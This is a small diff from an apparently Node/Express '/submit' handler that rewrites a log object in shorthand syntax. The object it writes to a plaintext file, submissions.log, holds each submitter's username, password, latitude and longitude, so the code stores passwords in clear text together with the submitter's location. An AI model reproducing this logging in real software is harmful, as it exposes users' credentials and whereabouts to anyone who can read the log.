@@ -18,10 +18,10 @@ app.post('/submit', async (req, res) => {
     const logData = {
       timestamp: new Date().toISOString(),
       userAgent: req.headers['user-agent'],
-      username: username,
-      password: password,
-      latitude: latitude,
-      longitude: longitude
+      username,
+      password,
+      latitude,
+      longitude
     };
 
     fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
